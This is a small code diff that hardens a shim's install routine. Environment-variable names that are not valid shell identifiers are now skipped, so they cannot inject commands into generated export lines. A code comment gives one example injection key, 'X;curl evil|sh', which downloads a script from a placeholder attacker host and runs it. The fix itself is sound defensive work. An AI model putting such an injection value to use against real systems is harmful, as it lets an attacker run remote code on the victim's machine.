@@ -308,6 +308,13 @@ def install() -> None:
             if user_env:
                 _lines = []
                 for _k, _v in user_env.items():
+                    # The value is quoted, but the KEY lands raw in `export {_k}=…` —
+                    # a key like `X;curl evil|sh` would inject. Only accept valid shell
+                    # identifiers; skip anything else rather than execute it.
+                    _ks = str(_k)
+                    if not (_ks.isidentifier() and _ks.isascii()):
+                        print(f"[shim] skipping env var with unsafe name: {_k!r}", flush=True)
+                        continue
                     _vs = str(_v)
                     _lines.append(f"export {_k}={_shlex.quote(_vs)}")
                     if _vs.startswith("/"):
